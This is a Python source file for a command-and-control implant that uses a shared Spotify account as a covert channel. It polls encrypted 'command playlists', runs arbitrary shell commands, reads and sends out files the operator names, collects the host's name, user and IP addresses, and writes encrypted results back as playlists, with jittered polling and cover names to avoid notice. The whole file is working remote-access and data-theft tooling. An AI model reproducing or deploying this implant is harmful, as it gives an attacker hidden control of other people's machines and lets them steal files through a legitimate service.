#!/usr/bin/env python3
"""c2_implant.py - C2 implant that polls for commands and returns results.

Run-once, in-memory, foreground script. No persistence, no disk artifacts.
Polls the shared Spotify account for encrypted command playlists,
executes them, and writes encrypted results back.

Usage:
    python c2_implant.py -k <encryption_key> [--interval 60] [--jitter 30]
"""

import argparse
import base64
import json
import os
import platform
import random
import socket
import subprocess
import time

import c2_protocol as proto
import spotapi as spot

__author__ = '@sourcefrenchy'
__email__ = 'jmamblat@icloud.com'
__status__ = 'PROTOTYPE'

# Maximum shell command execution time
SHELL_TIMEOUT = 30

# Maximum result data size before truncation
MAX_RESULT_SIZE = 500_000


class Implant:
    """C2 implant: polls for commands, executes, returns results."""

    def __init__(self, spotify: spot.Spot, encryption_key: str,
                 interval: int = 60, jitter: int = 30):
        """Initialize the implant.

        Args:
            spotify: Authenticated Spot instance.
            encryption_key: Shared AES-256-GCM passphrase.
            interval: Base polling interval in seconds.
            jitter: Random jitter range (+/-) in seconds.
        """
        self.spotify = spotify
        self.key = encryption_key
        self.interval = interval
        self.jitter = jitter
        self.processed_seqs = set()

    def run(self):
        """Main polling loop. Runs until KeyboardInterrupt."""
        print("[*] Implant started, polling for commands...")
        try:
            while True:
                self._poll_and_execute()
                sleep_time = self.interval + random.randint(
                    -self.jitter, self.jitter
                )
                sleep_time = max(10, sleep_time)
                time.sleep(sleep_time)
        except KeyboardInterrupt:
            print("\n[*] Implant stopped")

    def _poll_and_execute(self):
        """Check for new commands, execute, return results."""
        try:
            seq_groups = self.spotify.read_c2_playlists(
                channel=proto.CHANNEL_CMD
            )
        except Exception as err:
            print(f"[!] Poll error: {err}")
            return

        if not seq_groups:
            return

        for seq_num in sorted(seq_groups.keys()):
            if seq_num in self.processed_seqs:
                self.spotify.clean_c2_playlists(
                    proto.CHANNEL_CMD, seq=seq_num
                )
                continue

            chunk_metas = seq_groups[seq_num]
            try:
                payload = proto.reassemble_payload(chunk_metas)
                cmd_dict = proto.decode_message(payload, self.key)
                msg = proto.C2Message.from_command_dict(cmd_dict)
            except Exception as err:
                print(f"[!] Failed to decode seq={seq_num}: {err}")
                self.spotify.clean_c2_playlists(
                    proto.CHANNEL_CMD, seq=seq_num
                )
                continue

            print(f"[*] Executing seq={seq_num} "
                  f"module={msg.module}")

            result = self._execute(msg)
            self._send_result(result)
            self.spotify.clean_c2_playlists(
                proto.CHANNEL_CMD, seq=seq_num
            )
            self.processed_seqs.add(seq_num)

    def _execute(self, msg: proto.C2Message) -> proto.C2Message:
        """Dispatch to the appropriate module handler.

        Args:
            msg: Command message to execute.

        Returns:
            Result message with execution output.
        """
        handlers = {
            "shell": self._exec_shell,
            "exfil": self._exec_exfil,
            "sysinfo": self._exec_sysinfo,
        }
        handler = handlers.get(msg.module)
        if not handler:
            return proto.C2Message(
                module=msg.module, seq=msg.seq,
                status="error",
                data=f"Unknown module: {msg.module}",
            )
        try:
            return handler(msg)
        except Exception as err:
            return proto.C2Message(
                module=msg.module, seq=msg.seq,
                status="error", data=str(err),
            )

    def _exec_shell(self, msg: proto.C2Message) -> proto.C2Message:
        """Execute a shell command, capture stdout+stderr.

        Args:
            msg: Command with args["cmd"] containing the shell command.

        Returns:
            Result with combined stdout+stderr output.
        """
        cmd_str = msg.args.get("cmd", "")
        if not cmd_str:
            return proto.C2Message(
                module="shell", seq=msg.seq,
                status="error", data="Empty command",
            )

        try:
            result = subprocess.run(
                cmd_str, shell=True, capture_output=True,
                text=True, timeout=SHELL_TIMEOUT,
            )
            output = result.stdout + result.stderr
            if len(output) > MAX_RESULT_SIZE:
                output = output[:MAX_RESULT_SIZE] + "\n[truncated]"
            return proto.C2Message(
                module="shell", seq=msg.seq,
                status="ok" if result.returncode == 0 else "error",
                data=output,
            )
        except subprocess.TimeoutExpired:
            return proto.C2Message(
                module="shell", seq=msg.seq,
                status="error",
                data=f"Command timed out after {SHELL_TIMEOUT}s",
            )

    def _exec_exfil(self, msg: proto.C2Message) -> proto.C2Message:
        """Read a file and return its contents.

        Text files are returned as-is. Binary files are Base64-encoded.

        Args:
            msg: Command with args["path"] containing the file path.

        Returns:
            Result with file contents.
        """
        path = msg.args.get("path", "")
        if not path:
            return proto.C2Message(
                module="exfil", seq=msg.seq,
                status="error", data="Empty path",
            )

        try:
            with open(path, 'rb') as f:
                content = f.read()
        except (OSError, IOError) as err:
            return proto.C2Message(
                module="exfil", seq=msg.seq,
                status="error", data=str(err),
            )

        if len(content) > MAX_RESULT_SIZE:
            return proto.C2Message(
                module="exfil", seq=msg.seq,
                status="error",
                data=f"File too large: {len(content)} bytes "
                     f"(max {MAX_RESULT_SIZE})",
            )

        try:
            text = content.decode('utf-8')
            return proto.C2Message(
                module="exfil", seq=msg.seq,
                status="ok", data=text,
            )
        except UnicodeDecodeError:
            return proto.C2Message(
                module="exfil", seq=msg.seq,
                status="ok",
                data="b64:" + base64.b64encode(content).decode('utf-8'),
            )

    def _exec_sysinfo(self, msg: proto.C2Message) -> proto.C2Message:
        """Gather system information.

        Returns:
            Result with JSON-encoded system info.
        """
        info = {
            "os": platform.platform(),
            "hostname": socket.gethostname(),
            "username": self._get_username(),
            "ips": self._get_ips(),
            "pid": os.getpid(),
            "cwd": os.getcwd(),
        }
        return proto.C2Message(
            module="sysinfo", seq=msg.seq,
            status="ok", data=json.dumps(info, indent=2),
        )

    def _send_result(self, result: proto.C2Message):
        """Encode and write result to Spotify.

        Args:
            result: Result message to transmit.
        """
        try:
            encoded = proto.encode_message(
                result.to_result_dict(), self.key
            )
            chunks = proto.chunk_payload(
                encoded, result.seq, proto.CHANNEL_RES
            )
            self.spotify.write_c2_playlists(chunks)
            print(f"[*] Result sent for seq={result.seq}")
        except Exception as err:
            print(f"[!] Failed to send result seq={result.seq}: {err}")

    @staticmethod
    def _get_username() -> str:
        """Get current username safely."""
        try:
            return os.getlogin()
        except OSError:
            import getpass
            return getpass.getuser()

    @staticmethod
    def _get_ips() -> list:
        """Get local IP addresses."""
        ips = []
        try:
            hostname = socket.gethostname()
            for info in socket.getaddrinfo(hostname, None):
                addr = info[4][0]
                if addr not in ips and not addr.startswith('::'):
                    ips.append(addr)
        except socket.gaierror:
            pass
        return ips


def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description='SpotExfil C2 Implant'
    )
    parser.add_argument(
        '-k', '--key', required=True,
        help='Encryption passphrase (must match operator)'
    )
    parser.add_argument(
        '--interval', type=int, default=60,
        help='Base polling interval in seconds (default: 60)'
    )
    parser.add_argument(
        '--jitter', type=int, default=30,
        help='Random jitter range +/- seconds (default: 30)'
    )
    return parser.parse_args()


def main():
    """Main entry point."""
    args = parse_args()
    spotify = spot.Spot(use_cover_names=True)
    implant = Implant(
        spotify, args.key,
        interval=args.interval, jitter=args.jitter,
    )
    implant.run()


if __name__ == "__main__":
    main()
